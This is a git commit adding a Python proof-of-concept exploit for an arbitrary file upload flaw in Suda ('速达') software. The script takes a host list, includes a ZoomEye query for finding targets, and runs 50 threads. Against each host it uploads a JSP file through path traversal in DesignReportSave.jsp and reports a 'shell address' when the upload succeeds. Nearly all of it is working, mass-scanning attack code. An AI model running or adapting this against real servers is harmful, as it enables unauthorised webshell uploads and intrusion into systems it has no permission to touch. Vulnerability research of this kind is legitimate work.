366b49f505451ff46c2a6ba8db9a10b1c6050144
MD-SEC <MD_SEC@163.com>
2023-12-06 01:47:06 +0800

    速达软件全系产品存在任意文件上传漏洞

---
+++ Suda_Report_FileUpload_Poc.py
@@ -0,0 +1,68 @@
+#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+# author:MDSEC
+# from:https://github.com/MD-SEC/MDPOCS
+# app="速达软件-公司产品"
+# zoomeye:速达软件 +port:"8083"
+
+import sys
+import requests
+import csv
+import urllib3
+import hashlib
+from concurrent.futures import ThreadPoolExecutor
+
+if len(sys.argv) != 2:
+    print(
+        '+----------------------------------------------------------------------------------------------------------+')
+    print(
+        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
+    print(
+        '+----------------------------------------------------------------------------------------------------------+')
+    print(
+        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
+    print(
+        '+ EXP: python3 Ruijie_NBR_FileUpload_Poc.py url.txt                                                        +')
+    print(
+        '+----------------------------------------------------------------------------------------------------------+')
+    sys.exit()
+proxysdata = {
+'http': '127.0.0.1:8081'
+}  
+requests.packages.urllib3.disable_warnings()
+
+def exp(host):
+    if "http" in host:
+        url = host
+    else:
+        url ="http://"+host
+    host1=url.replace("http://","")
+    host2=host1.replace("https://","")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
+        "Host": "%s" %host2,
+        "Content-Type": "application/octet-stream",
+        "Accept-Encoding": "gzip, deflate"
+    }
+    vulurl = url + "/report/DesignReportSave.jsp?report=../test.jsp"
+    data='<% out.print("kkttxx");%>'
+    try:
+        r = requests.post(vulurl, data=data,headers=headers,verify=False)
+        r2 = requests.get(url+"/test.jsp")
+        if "kkttxx" in r2.text :
+            print("shell地址为："+url+"/test.jsp")     
+        else:
+            return 0
+            print (host+":false")
+    except:
+        return 0
+        print (host+":false")
+
+
+if __name__ == '__main__':
+    file = sys.argv[1]
+    data = open(file)
+    reader = csv.reader(data)
+    with ThreadPoolExecutor(50) as pool:
+        for row in reader:
+            pool.submit(exp, row[0])
